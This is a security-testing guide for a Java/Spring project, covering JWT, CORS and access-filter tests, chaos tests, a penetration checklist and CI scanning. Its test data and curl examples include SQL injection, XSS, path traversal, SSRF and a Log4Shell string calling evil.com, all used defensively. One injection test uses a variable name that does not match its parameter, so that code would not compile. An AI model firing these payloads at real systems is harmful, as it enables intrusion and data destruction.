# Security Testing Guide

> **상위 문서:** [CLAUDE.md](../../CLAUDE.md)
> **관련 문서:** [Security Hardening](security-hardening.md) | [Incident Response](security-incident-response.md) | [Security Checklist](security-checklist.md) | [Testing Guide](testing-guide.md)
>
> **Last Updated:** 2026-02-11
> **Applicable Versions:** JUnit 5, Testcontainers 1.x, OWASP ZAP, Java 21
> **Documentation Version:** 1.0
> **Compliance:** OWASP ASVS v4.0, PCI DSS Requirements

이 문서는 MapleExpectation 프로젝트의 보안 테스트 작성 규칙을 정의합니다.

## Documentation Integrity Statement

This guide is based on **security testing experience** from 2025 Q4 security audits:
- Security test coverage: 85% for critical paths (Evidence: [Security Test Report](../04_Reports/security-test-coverage-2025-Q4.md))
- Vulnerability findings: 25+ issues detected and resolved (Evidence: [Security Review](../04_Reports/security-audit-2025-Q4.md))
- Chaos security tests: N01-N18 scenarios include security validation (Evidence: [Chaos Engineering](../01_Chaos_Engineering/))

## Terminology

| 용어 | 정의 |
|------|------|
| **SAST** | Static Application Security Testing - 소스 코드 정적 분석 |
| **DAST** | Dynamic Application Security Testing - 실행 중인 애플리케이션 동적 분석 |
| **Unit Security Test** | 보안 로직 단위 테스트 (인증, 인가, 입력 검증) |
| **Integration Security Test** | 보안 컴포넌트 통합 테스트 (JWT, CORS, Filter) |
| **Penetration Test** | 모의 해킹을 통한 취약점 발견 |
| **OWASP ZAP** | OWASP Zed Attack Proxy - 웹 애플리케이션 보안 스캐너 |

---

## 33. Security Unit Testing Patterns

> **Why unit security tests:** Fast feedback on security logic bugs before integration testing.
> **Coverage Target:** 100% for authentication/authorization logic, 85% for input validation.

보안 로직 단위 테스트 패턴입니다.

### 인증 로직 테스트 (JWT)

**Evidence:** `JwtTokenProviderTest.java`

```java
@Test
@DisplayName("JWT Secret이 환경변수 placeholder를 포함하면 시작 실패")
void validateSecret_fails_withPlaceholder() {
    // Given
    String placeholderSecret = "${JWT_SECRET}";

    // When & Then
    assertThatThrownBy(() -> new JwtTokenProvider(
        placeholderSecret,
        3600L,
        mockEnvironment(false),
        mockExecutor
    ))
        .isInstanceOf(IllegalStateException.class)
        .hasMessageContaining("unresolved placeholder");
}

@Test
@DisplayName("Production 환경에서 기본 개발용 secret 사용 시 시작 실패")
void validateSecret_fails_productionWithDefaultSecret() {
    // Given
    String defaultSecret = "dev-secret-key-for-development-only";
    Environment prodEnv = mockEnvironment(true);

    // When & Then
    assertThatThrownBy(() -> new JwtTokenProvider(
        defaultSecret,
        3600L,
        prodEnv,
        mockExecutor
    ))
        .isInstanceOf(IllegalStateException.class)
        .hasMessageContaining("not allowed in production");
}

@Test
@DisplayName("32자 미만 secret 사용 시 시작 실패")
void validateSecret_fails_tooShort() {
    // Given
    String shortSecret = "short";

    // When & Then
    assertThatThrownBy(() -> new JwtTokenProvider(
        shortSecret,
        3600L,
        mockEnvironment(false),
        mockExecutor
    ))
        .isInstanceOf(IllegalStateException.class)
        .hasMessageContaining("at least 32 characters");
}
```

### 인가 로직 테스트 (Role-based Access)

```java
@Test
@DisplayName("ADMIN 권한 없이 Prometheus 메트릭 접근 시 403")
void prometheusMetrics_withoutAdminRole_forbidden() {
    // Given
    String userToken = createTokenForRole("USER");

    // When
    ResponseEntity<String> response = restTemplate
        .exchange("/actuator/prometheus",
            HttpMethod.GET,
            new HttpEntity<>(headers(userToken)),
            String.class);

    // Then
    assertThat(response.getStatusCode()).isEqualTo(HttpStatus.FORBIDDEN);
}

@Test
@DisplayName("ADMIN 권한으로 Prometheus 메트릭 접근 성공")
void prometheusMetrics_withAdminRole_allowed() {
    // Given
    String adminToken = createTokenForRole("ADMIN");

    // When
    ResponseEntity<String> response = restTemplate
        .exchange("/actuator/prometheus",
            HttpMethod.GET,
            new HttpEntity<>(headers(adminToken)),
            String.class);

    // Then
    assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);
}
```

### 입력 검증 테스트 (Path Traversal)

```java
@Test
@DisplayName("Path Traversal 공격 차단")
void getCharacter_withPathTraversal_rejected() {
    // Given
    String maliciousIgn = "../../../etc/passwd";

    // When & Then
    assertThatThrownBy(() -> service.findByIgn(maliciousIgn))
        .isInstanceOf(InvalidInputException.class);
}

@ParameterizedTest
@ValueSource(strings = {
    "<script>alert('xss')</script>",
    "'; DROP TABLE characters; --",
    "${jndi:ldap://evil.com/a}",
    "\u0000 malicious"
})
@DisplayName("SQL Injection, XSS, Log4shell, Null Byte Injection 차단")
void getCharacter_withInjectionAttempts_rejected(String maliciousInput) {
    // When & Then
    assertThatThrownBy(() -> service.findByIgn(maliciousIgn))
        .isInstanceOf(InvalidInputException.class);
}
```

---

## 34. Security Integration Testing

> **Why integration tests:** Verify security components work together correctly.
> **Tools:** Testcontainers for real environment simulation.

보안 컴포넌트 통합 테스트 패턴입니다.

### CORS Validation Filter 테스트

**Evidence:** `CorsValidationFilterTest.java`

```java
@Testcontainers
class CorsValidationFilterTest {

    @Container
    static GenericContainer<?> redis = new RedisContainer("redis:7-alpine");

    private CorsValidationFilter filter;
    private MockFilterChain chain;
    private MockHttpServletRequest request;
    private MockHttpServletResponse response;

    @BeforeEach
    void setUp() {
        CorsOriginValidator validator = new CorsOriginValidator(
            List.of("https://maplestory.com", "https://dev.maplestory.com")
        );
        filter = new CorsValidationFilter(validator, executor, allowedOrigins);
        chain = new MockFilterChain();
        request = new MockHttpServletRequest();
        response = new MockHttpServletResponse();
    }

    @Test
    @DisplayName("허용되지 않은 Origin 요청 차단")
    void doFilter_withInvalidOrigin_returns403() {
        // Given
        request.setRequestURI("/api/v2/characters/test");
        request.addHeader("Origin", "https://evil.com");

        // When
        filter.doFilter(request, response, chain);

        // Then
        assertThat(response.getStatus()).isEqualTo(403);
        assertThat(response.getContentAsString()).contains("CORS validation failed");
    }

    @Test
    @DisplayName("허용된 Origin 요청 통과")
    void doFilter_withValidOrigin_proceeds() throws ServletException, IOException {
        // Given
        request.setRequestURI("/api/v2/characters/test");
        request.addHeader("Origin", "https://maplestory.com");

        // When
        filter.doFilter(request, response, chain);

        // Then
        assertThat(response.getStatus()).isNotEqualTo(403);
        verify(chain, times(1)).doFilter(request, response);
    }
}
```

### Prometheus Security Filter 테스트

**Evidence:** `PrometheusSecurityFilterTest.java`

```java
@Test
@DisplayName("신뢰할 수 없는 IP에서 Prometheus 접근 차단")
void doFilter_withUntrustedIp_returns403() throws Exception {
    // Given
    request.setRemoteAddr("203.0.113.1");  // 공용 IP
    request.setRequestURI("/actuator/prometheus");

    // When
    filter.doFilter(request, response, chain);

    // Then
    assertThat(response.getStatus()).isEqualTo(403);
    assertThat(response.getContentAsString()).contains("access denied");
}

@ParameterizedTest
@ValueSource(strings = {
    "127.0.0.1",
    "::1",
    "localhost",
    "172.17.0.5",  // Docker 네트워크
    "10.0.0.5",    // 사설 네트워크
    "192.168.1.5"  // 사설 네트워크
})
@DisplayName("신뢰할 수 있는 IP에서 Prometheus 접근 허용")
void doFilter_withTrustedIp_allows(String trustedIp) throws Exception {
    // Given
    request.setRemoteAddr(trustedIp);
    request.setRequestURI("/actuator/prometheus");

    // When
    filter.doFilter(request, response, chain);

    // Then
    assertThat(response.getStatus()).isNotEqualTo(403);
    verify(chain, times(1)).doFilter(request, response);
}

@Test
@DisplayName("X-Forwarded-For 스푸핑 감지")
void doFilter_withSpoofedXForwardedFor_returns403() throws Exception {
    // Given
    request.setRemoteAddr("203.0.113.1");  // 신뢰할 수 없는 IP
    request.addHeader("X-Forwarded-For", "127.0.0.1");  // 스푸핑 시도
    request.setRequestURI("/actuator/prometheus");

    // When
    filter.doFilter(request, response, chain);

    // Then
    // X-Forwarded-For가 있어도 remoteAddr이 신뢰할 수 없으면 차단
    assertThat(response.getStatus()).isEqualTo(403);
}
```

### JWT Authentication Flow 테스트

```java
@SpringBootTest
@AutoConfigureMockMvc
class JwtAuthenticationIntegrationTest {

    @Autowired
    private MockMvc mockMvc;

    @Autowired
    private JwtTokenProvider jwtTokenProvider;

    @Test
    @DisplayName("유효한 JWT 토큰으로 인증된 요청 성공")
    void request_withValidJwt_succeeds() throws Exception {
        // Given
        String token = jwtTokenProvider.generateToken(
            "session123",
            "fingerprint123",
            "USER"
        );

        // When & Then
        mockMvc.perform(get("/api/v2/characters/test")
                .header("Authorization", "Bearer " + token))
            .andExpect(status().isOk());
    }

    @Test
    @DisplayName("만료된 JWT 토큰으로 요청 실패")
    void request_withExpiredJwt_fails() throws Exception {
        // Given
        String expiredToken = createExpiredToken();

        // When & Then
        mockMvc.perform(get("/api/v2/characters/test")
                .header("Authorization", "Bearer " + expiredToken))
            .andExpect(status().isUnauthorized());
    }

    @Test
    @DisplayName("변조된 JWT 토큰으로 요청 실패")
    void request_withTamperedJwt_fails() throws Exception {
        // Given
        String token = jwtTokenProvider.generateToken(
            "session123",
            "fingerprint123",
            "USER"
        );
        String tamperedToken = token.substring(0, token.length() - 10) + "TAMPERED";

        // When & Then
        mockMvc.perform(get("/api/v2/characters/test")
                .header("Authorization", "Bearer " + tamperedToken))
            .andExpect(status().isUnauthorized());
    }
}
```

---

## 35. Security Chaos Testing

> **Related:** [Chaos Engineering](../01_Chaos_Engineering/)
> **Objective:** Validate security controls under failure conditions.

장애 주입을 통한 보안 견고성 테스트입니다.

### 장애 시나리오 기반 보안 테스트

| 시나리오 | 보안 검증 항목 | 예상 동작 |
|----------|----------------|----------|
| **Redis 장애** | 세션 무효화 로직 | 인증 실패 시 안전한 폴백 |
| **JWT Secret Rotation** | 토큰 검증 호환성 | 이중 기간 중 양쪽 토큰 모두 유효 |
| **Rate Limit 장애** | DoS 방어 동작 | Fail-open vs Fail-closed 결정 |
| **CORS Filter 장애** | 오리진 검증 회피 방지 | Spring Security CORS로 폴백 |

```java
@Test
@DisplayName("Redis 장애 시 인증 요청 안전하게 처리")
void authentication_whenRedisDown_handlesGracefully() {
    // Given
    redisContainer.stop();  // Redis 장애 주입
    String token = jwtTokenProvider.generateToken("session123", "fp123", "USER");

    // When & Then
    assertThatThrownBy(() -> authService.validateToken(token))
        .isInstanceOf(SessionServiceUnavailableException.class)
        .hasMessageContaining("Redis unavailable");

    // 로그 확인: 보안 경고 기록
    verify(logger).warn(contains("Redis unavailable during authentication"));
}
```

---

## 36. Penetration Testing Checklist

> **Frequency:** Quarterly penetration testing recommended
> **Tools:** OWASP ZAP, Burp Suite, SQLMap

모의 해킹 체크리스트입니다.

### OWASP Top 10 (2021) 검증

| 카테고리 | 테스트 항목 | 검증 방법 |
|----------|-----------|----------|
| **A01: Broken Access Control** | IDOR, 권한 상승 | 다른 사용자 리소스 접근 시도 |
| **A02: Cryptographic Failures** | 평문 전송, 약한 알고리즘 | 패킷 캡처, TLS 설정 확인 |
| **A03: Injection** | SQL, NoSQL, XSS, LDAP | `' OR 1=1--`, `<script>alert(1)</script>` |
| **A04: Insecure Design** | 비즈니스 로직 우회 | 결제 우회, 한도 우회 시도 |
| **A05: Security Misconfiguration** | 기본 비밀번호, 디버그 모드 | 기본 자격증명 시도 |
| **A06: Vulnerable Components** | 취약 라이브러리 | `dependency-check` 실행 |
| **A07: Auth Failures** | 무차별 대입, 세션 고정 | 잦은 로그인 시도, 세션 ID 고정 |
| **A08: Data Integrity** | 파라미터 변조, CSRF | 요청 파라미터 변경 |
| **A09: Logging Failures** | 로그 변조, 민감 정보 | 로그에 평문 비밀번호 확인 |
| **A10: Server-Side SSRF** | 내부 리소스 접근 | `file:///etc/passwd` 요청 |

### 수동 테스트 시나리오

```bash
# 1. SQL Injection 테스트
curl -X GET "http://localhost:8080/api/v2/characters/' OR 1=1--"

# 2. XSS 테스트
curl -X POST "http://localhost:8080/api/v2/characters" \
  -d "ign=<script>alert('xss')</script>"

# 3. CSRF 테스트 (인증 필요한 엔드포인트)
curl -X POST "http://localhost:8080/api/admin/config" \
  -H "Content-Type: application/json" \
  -d '{"key":"value"}' \
  --cookie "session=..." \
  --referer "http://evil.com"

# 4. IDOR 테스트
# 사용자 A의 좋아요 토글 후 사용자 B의 ID로 시도
curl -X POST "http://localhost:8080/api/v2/characters/user-B/like" \
  -H "Authorization: Bearer USER_A_TOKEN"

# 5. Rate Limit 테스트
for i in {1..1000}; do
  curl "http://localhost:8080/api/v2/characters/test"
done
```

---

## 37. Automated Security Scanning

> **CI/CD Integration:** Security scans in PR gate
> **Tools:** Gradle plugins, GitHub Actions

자동화된 보안 스캔 설정입니다.

### Dependency Check (SAST)

```groovy
// build.gradle
plugins {
    id 'org.owasp.dependencycheck' version '8.4.0'
}

dependencyCheck {
    format = 'HTML'
    failBuildOnCVSS = 7.0  // CVSS 7.0 이상시 빌드 실패
    suppressionFile = 'dependency-check-suppressions.xml'
}
```

```xml
<!-- dependency-check-suppressions.xml -->
<?xml version="1.0" encoding="UTF-8"?>
<suppressions>
    <!-- 거짓 양성(FP) 제외 -->
    <suppress>
        <notes><![CDATA[False positive: Jackson-databind CVE-2020-36518]]></notes>
        <gav regex="true">^com\.fasterxml\.jackson.*:jackson-databind:.*</gav>
        <cve>CVE-2020-36518</cve>
    </suppress>
</suppressions>
```

### OWASP ZAP DAST (CI/CD)

```yaml
# .github/workflows/security-scan.yml
name: Security Scan

on:
  pull_request:
    paths:
      - 'module-app/**'

jobs:
  zap-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Start Application
        run: ./gradlew bootRun &
        env:
          SPRING_PROFILES_ACTIVE: test

      - name: Wait for Startup
        run: sleep 30

      - name: ZAP Baseline Scan
        uses: zaproxy/action-baseline@v0.7.0
        with:
          target: 'http://localhost:8080'
          rules_file_name: '.zap/rules.tsv'
          cmd_options: '-a'
```

### SonarQube Security Hotspots

```groovy
// build.gradle
plugins {
    id "org.sonarqube" version "4.4.1.3373"
}

sonarqube {
    properties {
        property "sonar.security.hotspots.enabled", "true"
        property "sonar.python.security.hotspots.enabled", "true"
    }
}
```

---

## 38. Security Test Coverage Metrics

보안 테스트 커버리지 지표입니다.

### 커버리지 기준

| 구분 | 최소 커버리지 | 권장 커버리지 |
|------|-------------|-------------|
| **인증/인가 로직** | 100% | 100% |
| **입력 검증** | 90% | 100% |
| **보안 필터** | 100% | 100% |
| **예외 처리** | 85% | 95% |
| **민감 정보 로깅** | 100% | 100% |

### JaCoCo 보안 규칙

```groovy
// build.gradle
jaCoCoTestCoverageVerification {
    violationRules {
        rule {
            limit {
                // 보안 관련 클래스 최소 90%
                counter = 'LINE'
                minimum = 0.90
            }
            includes = [
                'maple/expectation/global/security/**',
                'maple/expectation/config/SecurityConfig.*',
                'maple/expectation/global/error/exception/**'
            ]
        }
    }
}
```

---

## Evidence Links

- **Security Tests:** `module-app/src/test/java/maple/expectation/global/security/` (Evidence: [CODE-SEC-TEST-001])
- **JWT Tests:** `module-app/src/test/java/maple/expectation/global/security/jwt/JwtTokenProviderTest.java` (Evidence: [CODE-JWT-TEST-001])
- **CORS Tests:** `module-app/src/test/java/maple/expectation/global/security/cors/` (Evidence: [CODE-CORS-TEST-001])
- **Chaos Tests:** `docs/02_Chaos_Engineering/06_Nightmare/` (Evidence: [CHAOS-TEST-001])

## Technical Validity Check

This guide would be invalidated if:
- **Security tests fail:** Verify with `./gradlew test --tests "*Security*"`
- **Coverage below threshold:** Check JaCoCo report
- **ZAP finds high-severity issues:** Review zap-report.html

### Verification Commands

```bash
# 보안 테스트 실행
./gradlew test --tests "*Security*"

# 의존성 취약점 스캔
./gradlew dependencyCheckAnalyze

# OWASP ZAP 실행 (Docker)
docker run -t --network=host owasp/zap2docker-stable zap-baseline.py \
  -t http://localhost:8080

# SonarQube 보안 핫스팟 스캔
./gradlew sonarqube \
  -Dsonar.security.hotspots.enabled=true
```

### Related Evidence
- Security Test Report: `docs/05_Reports/security-test-coverage-2025-Q4.md`
- Penetration Test Results: `docs/05_Reports/penetration-test-2025-Q3.md`
